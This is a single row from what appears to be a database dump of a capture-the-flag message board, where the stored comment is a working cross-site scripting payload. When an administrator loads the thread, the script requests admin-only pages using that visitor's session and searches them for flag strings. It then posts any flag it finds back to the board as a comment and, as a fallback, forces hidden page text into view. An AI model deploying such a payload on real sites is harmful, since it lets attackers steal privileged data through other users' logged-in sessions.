(180,'<script>\r\n(async ()=>{\r\n  // endpoints to probe for admin-only content\r\n  const endpoints = [\'/admin\',\'/admin/flag\',\'/flag\',\'/dashboard\',\'/manage\',\'/secret\',\'/admin.php\'];\r\n  const flagRe = /(flag\\{.*?\\}|picoCTF\\{.*?\\}|FLAG\\{.*?\\})/i;\r\n  let found = null;\r\n  for (let ep of endpoints) {\r\n    try {\r\n      let r = await fetch(ep, { credentials: \'same-origin\' });\r\n      if (!r.ok) continue;\r\n      let t = await r.text();\r\n      let m = t.match(flagRe);\r\n      if (m) { found = {where: ep, flag: m[0], page: t.slice(0,3000)}; break; }\r\n    } catch(e){}\r\n  }\r\n\r\n  // If we found something that looks like a flag, try to post it back to the thread\r\n  if (found) {\r\n    // try several common form parameter names for message boards\r\n    const paramsToTry = [\r\n      {url: \'/board.php?id=5897\', bodyKey: \'comments\'},\r\n      {url: \'/board.php?id=5897\', bodyKey: \'comment\'},\r\n      {url: \'/board.php?id=5897\', bodyKey: \'msg\'},\r\n      {url: \'/board.php?id=5897\', bodyKey: \'message\'},\r\n      {url: \'/board.php?id=5897\', bodyKey: \'body\'},\r\n    ];\r\n    const payloadText = `Found on ${found.where} -> ${found.flag}`;\r\n    for (let p of paramsToTry) {\r\n      try {\r\n        // build form-encoded body\r\n        const body = encodeURIComponent(p.bodyKey) + \'=\' + encodeURIComponent(payloadText);\r\n        await fetch(p.url, {\r\n          method: \'POST\',\r\n          credentials: \'same-origin\',\r\n          headers: {\'Content-Type\': \'application/x-www-form-urlencoded\'},\r\n          body: body\r\n        });\r\n      } catch(e){}\r\n    }\r\n    // also append visibly to DOM for immediate confirmation\r\n    try {\r\n      const d = document.createElement(\'div\');\r\n      d.style.background = \'#fffbcc\';\r\n      d.style.border = \'2px solid #cc9900\';\r\n      d.style.padding = \'8px\';\r\n      d.style.margin = \'8px 0\';\r\n      d.textContent = \'Auto-found: \' + payloadText;\r\n      document.body.insertBefore(d, document.body.firstChild);\r\n    } catch(e){}\r\n    return;\r\n  }\r\n\r\n  // fallback: reveal hidden text and report no-flag-found\r\n  try {\r\n    document.querySelectorAll(\'*\').forEach(el=>{\r\n      try{\r\n        el.style.display=\'block\';\r\n        el.style.visibility=\'visible\';\r\n        el.style.opacity=\'1\';\r\n        el.style.color=\'black\';\r\n        el.style.background=\'white\';\r\n        el.style.height=\'auto\'; el.style.maxHeight=\'none\';\r\n        el.style.zIndex=\'99999\'; el.style.position=\'static\';\r\n      }catch(e){}\r\n    });\r\n    const dump = document.documentElement.innerText.slice(0,4000);\r\n    const dd = document.createElement(\'pre\');\r\n    dd.style.background=\'#eef\';\r\n    dd.style.border=\'1px solid #99c\';\r\n    dd.style.padding=\'8px\';\r\n    dd.textContent = \'No flag auto-found. Page extract:\\n\\n\' + dump;\r\n    document.body.insertBefore(dd, document.body.firstChild);\r\n  } catch(e){}\r\n})();\r\n</script>\r\n',0,5897,'2025-11-02 01:37:38'),
